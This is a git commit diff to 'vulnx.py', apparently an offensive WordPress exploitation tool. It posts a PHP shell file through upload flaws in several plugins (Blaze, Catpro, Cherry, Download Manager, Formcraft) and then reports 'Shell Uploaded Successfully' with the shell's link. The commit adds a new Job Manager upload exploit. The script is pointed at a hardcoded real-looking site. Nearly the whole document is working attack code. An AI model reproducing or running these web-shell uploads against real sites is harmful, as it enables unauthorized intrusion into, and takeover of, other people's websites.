340d78bff33043f46bbae96bc97a339fab8c043a
anouarbensaad <bensaad.tig@gmail.com>
2019-05-10 13:09:40 +0100

    /media/tig/ANOUAR/anouar/CCF_000004.pdf

--- vulnx.py
+++ vulnx.py
@@ -4,12 +4,17 @@ import os
 import argparse
 import requests
 import urllib
+import datetime
 
 B = '\033[94m' #blue
 R = '\033[91m' # red
 W = '\033[0m'  # white
 Y = '\033[93m' # yellow
 G = '\033[92m' # green
+
+now = datetime.datetime.now()
+year = now.strftime('%Y')
+month= now.strftime('%m')
 
 url = "https://www.maplatine.com"
 def banner():
@@ -66,6 +71,7 @@ def contentw():
         wp_cherry()
         wp_dm()
         wp_fromcraft()
+        wp_jobmanager()
     elif drupal:
         print ('%s[%i] %s %s Drupal \n\n' % (W,id,url,G))
     elif prestashop:
@@ -78,7 +84,7 @@ def contentw():
 def wp_blaze():
     options = {
                 'Content_Type':'multipart/form-data',
-               'album_img':open('VulnX.php','rb'),
+               'album_img':[open('VulnX.php','rb')],
                'task':'blaze_add_new_album',
                'album_name':'',
                'album_desc':''
@@ -88,9 +94,9 @@ def wp_blaze():
     content  = send_shell.text
     check_blaze = re.findall("\/uploads\/blaze\/(.*?)\/big\/VulnX.php", content)
     if check_blaze:
-        print ('%s [%s+%s] Blaze Plugin%s ---------------- %s YES' %(W,G,W,W,G))
+        print ('%s [%s+%s] Blaze Plugin%s -------------- %s YES' %(W,G,W,W,G))
     else:
-        print ('%s [%s-%s] Blaze Plugin%s ---------------- %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Blaze Plugin%s -------------- %s NO' %(W,R,W,W,R))    
 
 
 ################ Catpro Plugin #####################
@@ -98,7 +104,7 @@ def wp_blaze():
 def wp_catpro():
     options = {
             'Content_Type':'multipart/form-data',
-            'album_img':open('VulnX.php','rb'),
+            'album_img':[open('VulnX.php','rb')],
             'task':'cpr_add_new_album',
             'album_name':'',
             'album_desc':''
@@ -108,9 +114,9 @@ def wp_catpro():
     content  = send_shell.text
     check_catpro = re.findall("\/uploads\/blaze\/(.*?)\/big\/VulnX.php", content)
     if check_catpro:
-        print ('%s [%s+%s] Catpro Plugin%s --------------- %s YES' %(W,G,W,W,G))
+        print ('%s [%s+%s] Catpro Plugin%s ------------- %s YES' %(W,G,W,W,G))
     else:
-        print ('%s [%s-%s] Catpro Plugin%s --------------- %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Catpro Plugin%s ------------- %s NO' %(W,R,W,W,R))    
 
 ################ Cherry Plugin #####################
 
@@ -127,10 +133,10 @@ def  wp_cherry():
     content  = response.text
     check_cherry = re.findall("Vuln X", content)
     if check_cherry:
-        print ('%s [%s+%s] Cherry Plugin%s --------------- %s YES' %(W,G,W,W,G))
+        print ('%s [%s+%s] Cherry Plugin%s ------------- %s YES' %(W,G,W,W,G))
         print ('%s [*]Shell Uploaded Successfully \n %s link : %s ' % ( B,W, dump_data ))
     else:
-        print ('%s [%s-%s] Cherry Plugin%s --------------- %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Cherry Plugin%s ------------- %s NO' %(W,R,W,W,R))    
 
 ################ Download Manager Plugin #####################
 def wp_dm():
@@ -145,10 +151,10 @@ def wp_dm():
     content  = response.text
     check_dm = re.findall("Vuln X", content)
     if check_dm:
-        print ('%s [%s+%s] Download Manager Plugin %s ---- %s YES' %(W,G,W,W,G))
+        print ('%s [%s+%s] Download Manager Plugin%s---- %s YES' %(W,G,W,W,G))
         print ('%s [*]Shell Uploaded Successfully \n %s link : %s ' % ( B,W, dump_data ))
     else:
-        print ('%s [%s-%s] Download Manager Plugin %s ---- %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Download Manager Plugin%s --- %s NO' %(W,R,W,W,R))    
 
 ################ Fromcraft Plugin #####################
 def wp_fromcraft():
@@ -162,12 +168,35 @@ def wp_fromcraft():
     send_shell = requests.post(endpoint,options)
     response  = send_shell.text
     dump_data  = url + "/wp-content/plugins/formcraft/file-upload/server/php/files/VulnX.php?Vuln=X"
-    check_fromcraft = re.findall("{\"files", response)
+    check_fromcraft = re.findall("\"files", response)
     if check_fromcraft:
-        print ('%s [%s+%s] Fromcraft Plugin%s ------------ %s YES' %(W,G,W,W,G))
+        print ('%s [%s+%s] Fromcraft Plugin%s ---------- %s YES' %(W,G,W,W,G))
         print ('%s [*]Shell Uploaded Successfully \n %s link : %s ' % ( B,W, dump_data ))
     else:
-        print ('%s [%s-%s] Fromcraft Plugin%s ------------ %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Fromcraft Plugin%s ---------- %s NO' %(W,R,W,W,R))    
+
+################ Job Manager Plugin #####################
+
+def wp_jobmanager():
+    endpoint = url + "/jm-ajax/upload_file/"
+    image = open('vulnx.gif','rb')
+    field = "file[]"
+    options = {
+            'Content_Type':'form-data',
+            field:image
+    }
+    send_image = requests.post(endpoint,options)
+    dump_data = url + "/wp-content/uploads/job-manager-uploads/file/"+year+"/"+month+"/vulnx.gif"
+    response=requests.get(dump_data, options)
+    res  = response.headers['content-type']
+    check_jobmanager = re.findall("image\/gif", res)
+    if check_jobmanager:
+        print ('%s [%s+%s] Job Manager Plugin%s -------- %s YES' %(W,G,W,W,G))
+        print ('%s [*]Shell Uploaded Successfully \n %s link : %s ' % ( B,W, dump_data ))
+    else:
+        print ('%s [%s-%s] Job Manager Plugin%s ------- %s NO' %(W,R,W,W,R))    
+
+
 
 
 if __name__ == "__main__":
